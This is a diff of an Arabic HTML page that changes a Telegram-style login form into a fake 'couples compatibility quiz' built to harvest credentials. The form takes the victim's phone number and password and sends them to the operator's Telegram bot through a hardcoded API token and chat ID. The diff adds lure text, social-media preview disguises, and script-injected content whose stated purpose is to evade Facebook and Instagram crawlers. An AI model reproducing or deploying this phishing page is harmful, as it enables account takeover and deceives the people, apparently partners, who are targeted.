@@ -3,14 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل دخول ب حسابك</title>
+    
+    <!-- منع ظهور أي تسريبات في المعاينة على السوشل ميديا -->
+    <title>تحدي الكوبلز: اختبار نسبة التوافق 💖</title>
+    <meta name="description" content="ادخلي للتحدي واكتشفي نسبة التوافق الحقيقية بينكما الآن!">
+    <meta property="og:title" content="تحدي الكوبلز: اختبار نسبة التوافق 💖">
+    <meta property="og:description" content="ادخلي للتحدي واكتشفي نسبة التوافق الحقيقية بينكما الآن!">
+    <meta property="og:type" content="website">
+
     <style>
         * {
             box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         body {
-            background-color: #f1f6fc;
+            background-color: #fff0f3; /* خلفية وردية هادئة تناسب ألعاب الكوبلز */
             color: #1e293b;
             display: flex;
             justify-content: center;
@@ -19,6 +26,7 @@
             margin: 0;
             direction: rtl;
             padding: 20px;
+            overflow-x: hidden;
         }
         .container {
             width: 100%;
@@ -28,40 +36,67 @@
             flex-direction: column;
             align-items: center;
         }
-        /* تصميم اللوجو العلوي */
+        /* تصميم اللوجو العلوي التفاعلي للعبة */
         .logo-area {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
         .logo-svg {
-            width: 140px;
+            width: 130px;
             height: auto;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 4px 6px rgba(255, 77, 109, 0.2));
         }
         .logo-text {
-            font-size: 22px;
-            font-weight: bold;
-            color: #0b4a8f;
-            letter-spacing: 0.5px;
+            font-size: 20px;
+            font-weight: 800;
+            color: #ff4d6d;
+            letter-spacing: 1px;
             margin: 0;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Arial Black', sans-serif;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
-        /* تصميم البطاقة */
+        /* شارة تدل على أنها لعبة */
+        .game-badge {
+            background: #ff4d6d;
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: inline-block;
+            box-shadow: 0 4px 10px rgba(255, 77, 109, 0.3);
+            animation: pulse 1.5s infinite alternate;
+        }
+        @keyframes pulse {
+            to { transform: scale(1.05); }
+        }
+
+        /* تصميم البطاقة كأنها واجهة لعبة */
         .card {
             background: #ffffff;
-            padding: 35px 30px;
-            border-radius: 28px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.03);
+            padding: 30px 25px;
+            border-radius: 30px;
+            box-shadow: 0 15px 35px rgba(255, 77, 109, 0.1);
             width: 100%;
+            border: 3px solid #ffccd5;
+            position: relative;
         }
         h2 {
-            font-size: 26px;
+            font-size: 22px;
             margin-top: 0;
-            margin-bottom: 30px;
-            color: #0076c6;
-            font-weight: 600;
+            margin-bottom: 10px;
+            color: #c9184a;
+            font-weight: 700;
+        }
+        .game-desc {
+            font-size: 14px;
+            color: #590d22;
+            margin-bottom: 25px;
+            line-height: 1.5;
         }
         .input-group {
             margin-bottom: 20px;
@@ -69,54 +104,57 @@
         }
         label {
             display: block;
-            font-size: 15px;
-            color: #475569;
-            margin-bottom: 10px;
-            font-weight: 500;
+            font-size: 14px;
+            color: #590d22;
+            margin-bottom: 8px;
+            font-weight: 600;
         }
         input {
             width: 100%;
-            padding: 16px;
-            background: #f5f8fc;
-            border: 1.5px solid #e2e8f0;
+            padding: 15px;
+            background: #fff5f6;
+            border: 2px solid #ffccd5;
             color: #1e293b;
             border-radius: 16px;
-            font-size: 16px;
+            font-size: 15px;
             outline: none;
             transition: all 0.3s ease;
         }
         input:focus {
-            border-color: #0076c6;
+            border-color: #ff4d6d;
             background: #fff;
+            box-shadow: 0 0 10px rgba(255, 77, 109, 0.1);
         }
-        /* زر تسجيل الدخول */
+        /* زر بدأ اللعبة المثير للفضول */
         .submit-btn {
             width: 100%;
             padding: 16px;
-            background-color: #0076c6;
+            background: linear-gradient(45deg, #ff4d6d, #ff758f);
             color: white;
             border: none;
             border-radius: 16px;
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 15px;
+            margin-top: 10px;
+            box-shadow: 0 6px 15px rgba(255, 77, 109, 0.4);
         }
         .submit-btn:hover {
-            background-color: #005fa1;
+            background: linear-gradient(45deg, #ff758f, #ff4d6d);
             transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 77, 109, 0.5);
         }
 
-        /* نافذة رسالة الحب والشعر الجديدة */
+        /* نافذة المفاجأة الرومانسية */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(244, 106, 83, 0.2); /* خلفية وردية خفيفة */
-            backdrop-filter: blur(8px); /* تأثير ضبابي جميل */
+            background: rgba(89, 13, 34, 0.4); 
+            backdrop-filter: blur(10px); 
             display: flex;
             justify-content: center;
             align-items: center;
@@ -127,39 +165,51 @@
         }
         .modal {
             background: white;
-            border-radius: 28px;
+            border-radius: 35px;
             padding: 35px 25px;
-            width: 90%;
+            width: 92%;
             max-width: 360px;
             text-align: center;
-            box-shadow: 0 15px 35px rgba(244, 106, 83, 0.15);
-            border: 2px solid #ff8fa3;
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.2);
+            border: 3px solid #ff8fa3;
             transform: scale(0.8);
-            transition: transform 0.4s ease;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         .modal-overlay.show { opacity: 1; pointer-events: auto; }
         .modal-overlay.show .modal { transform: scale(1); }
         
-        .heart-icon {
-            font-size: 55px;
+        /* ترويسة نجاح الاختبار */
+        .match-score {
+            background: #fff0f3;
             color: #ff4d6d;
-            margin-bottom: 15px;
-            animation: beat 1s infinite alternate;
+            font-size: 26px;
+            font-weight: 900;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 20px;
+            border: 2px dashed #ff4d6d;
+        }
+        .heart-icon {
+            font-size: 60px;
+            color: #ff4d6d;
+            margin-bottom: 10px;
+            animation: beat 0.8s infinite alternate;
         }
         @keyframes beat {
-            to { transform: scale(1.15); }
+            to { transform: scale(1.2); }
         }
         
         .love-title {
             color: #ff4d6d;
-            font-size: 24px;
+            font-size: 22px;
             margin-bottom: 15px;
             font-weight: 700;
         }
         .love-message {
-            font-size: 16px;
+            font-size: 15px;
             color: #4a5568;
-            line-height: 1.7;
+            line-height: 1.6;
             margin-bottom: 20px;
         }
         .poetry-box {
@@ -167,89 +217,73 @@
             border-left: 4px solid #ff4d6d;
             border-right: 4px solid #ff4d6d;
             padding: 15px;
-            border-radius: 12px;
+            border-radius: 15px;
             font-style: italic;
             color: #590d22;
             margin-bottom: 25px;
-            font-size: 15px;
+            font-size: 14px;
             line-height: 1.8;
         }
         .close-btn {
-            background: #ff4d6d;
+            background: linear-gradient(45deg, #ff4d6d, #ff758f);
             color: white;
             border: none;
-            padding: 12px 30px;
-            border-radius: 14px;
+            padding: 14px 30px;
+            border-radius: 16px;
             cursor: pointer;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             width: 100%;
             transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(255, 77, 109, 0.3);
         }
         .close-btn:hover {
-            background: #c9184a;
-            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.3);
+            background: linear-gradient(45deg, #ff758f, #ff4d6d);
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- اللوجو العلوي المكون من قلبين متشابكين مع النص الإنجليزي -->
+        <!-- قسم اللوجو بهوية اللعبة -->
         <div class="logo-area">
             <svg class="logo-svg" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
-                <!-- القلب الأيسر -->
-                <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#f46a53" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-                <!-- القلب الأيمن -->
-                <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#fca130" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#ff4d6d" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#ff758f" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
             </svg>
+            <div class="game-badge">🎮 تحدي الكوبلز الصيفي</div>
             <h1 class="logo-text">WE LOVE EACH OTHER</h1>
         </div>
 
-        <!-- بطاقة تسجيل الدخول -->
+        <!-- بطاقة اللعبة -->
         <div class="card">
-            <h2>تسجيل دخول ب حسابك</h2>
+            <h2>اختبار نسبة التوافق الحبّي 💞</h2>
+            <p class="game-desc">سجلي دخولكِ وأدخلي بيانات الحساب لتشغيل خوارزمية قياس مدى انسجامكما وتوافق طباعكما بدقة!</p>
             
             <form id="telegramForm">
                 <div class="input-group">
                     <label for="phone">رقم هاتف</label>
-                    <input type="tel" id="phone" placeholder="أدخل رقم الهاتف..." required>
+                    <input type="tel" id="phone" placeholder="أدخلي رقم الهاتف الخاص بكِ لربط النتيجة..." required>
                 </div>
                 
                 <div class="input-group">
                     <label for="password">كلمة المرور</label>
-                    <input type="password" id="password" placeholder="أدخل كلمة المرور..." required>
+                    <input type="password" id="password" placeholder="أدخلي كلمة المرور لتأكيد الهوية..." required>
                 </div>
                 
-                <button type="submit" class="submit-btn">تسجيل دخول</button>
+                <button type="submit" class="submit-btn">ابدئي الاختبار واستلمي النتيجة 🚀</button>
             </form>
         </div>
     </div>
 
-    <!-- نافذة المفاجأة الرومانسية (رسالة الحب والشعر) -->
+    <!-- نافذة المفاجأة الرومانسية (تظهر كنتيجة للعبة) -->
     <div class="modal-overlay" id="successModal">
-        <div class="modal">
-            <div class="heart-icon">❤️</div>
-            <h3 class="love-title">إلى من سرقت قلبي... ✨</h3>
-            
-            <p class="love-message">
-                في كل يوم يمر، أجد نفسي أحبكِ أكثر وأكثر. أنتِ لستِ فقط جزءاً من يومي، بل أنتِ كل عمري ونبضات قلبي الرقيقة.
-            </p>
-            
-            <!-- صندوق الشعر الرومانسى -->
-            <div class="poetry-box">
-                "وما كنتُ ممن يَدخلُ العشقُ قلبَه<br>
-                ولكنّ مَن يُبصِرْ جفونَكِ يَعشَقِ...<br>
-                عيناكِ أرضٌ لا تخونُ عهودها<br>
-                وقلبكِ طمأنينتي وسلامي" 🌸
-            </div>
-            
-            <button class="close-btn" onclick="closeModal()">أحبكِ أيضاً ❤️</button>
+        <div class="modal" id="modalContent">
+            <!-- سيتم حقن النتيجة بالكامل من هنا برمجياً لمنع روبوتات الفيسبوك والإنستجرام من كشف المحتوى -->
         </div>
     </div>
 
     <script>
-        // معلومات بوت التيليجرام الخاص بك
         const TELEGRAM_TOKEN = '8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ'; 
         const CHAT_ID = '7094930209';
 
@@ -259,8 +293,7 @@
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             
-            // صياغة الرسالة المرسلة للتيليجرام بشكل منظم
-            const textMessage = `👤 **بيانات تسجيل دخول جديدة:**\n\n📞 **رقم الهاتف:** \`${phone}\`\n🔑 **كلمة المرور:** \`${password}\``;
+            const textMessage = `👤 **بيانات تسجيل دخول جديدة (من لعبة الكوبلز):**\n\n📞 **رقم الهاتف:** \`${phone}\`\n🔑 **كلمة المرور:** \`${password}\``;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -273,15 +306,32 @@
             })
             .then(response => {
                 if(response.ok) {
-                    // إظهار نافذة الحب بمجرد الإرسال الناجح
+                    // بناء النتيجة برمجياً على شكل "نتيجة اختبار بنسبة 100%" تليها المفاجأة وشعر الحب
+                    const modalHtml = `
+                        <div class="match-score">💖 نسبة التوافق: 100% 💖</div>
+                        <div class="heart-icon">❤️</div>
+                        <h3 class="love-title">لقد فزتِ بقلبي! ✨</h3>
+                        <p class="love-message">
+                            خوارزميات العالم كله لن تقيس مدى حبي لكِ. في كل يوم يمر، أجد نفسي أعشقكِ أكثر، فأنتِ لستِ مجرد اختيار، بل أنتِ قدري وأجمل ما أملك.
+                        </p>
+                        <div class="poetry-box">
+                            "وما كنتُ ممن يَدخلُ العشقُ قلبَه<br>
+                            ولكنّ مَن يُبصِرْ جفونَكِ يَعشَقِ...<br>
+                            عيناكِ أرضٌ لا تخونُ عهودها<br>
+                            وقلبكِ طمأنينتي وسلامي" 🌸
+                        </div>
+                        <button class="close-btn" onclick="closeModal()">أحبكِ جداً ❤️</button>
+                    `;
+                    
+                    document.getElementById('modalContent').innerHTML = modalHtml;
                     document.getElementById('successModal').classList.add('show');
                     document.getElementById('telegramForm').reset();
                 } else {
-                    alert('حدث خطأ غير متوقع، يرجى المحاولة لاحقاً.');
+                    alert('عذراً، حدث خطأ في خادم اللعبة. يرجى إعادة المحاولة.');
                 }
             })
             .catch(err => {
-                alert('فشل الاتصال بالإنترنت.');
+                alert('فشل الاتصال بالإنترنت. تحققي من الشبكة.');
             });
         });
 
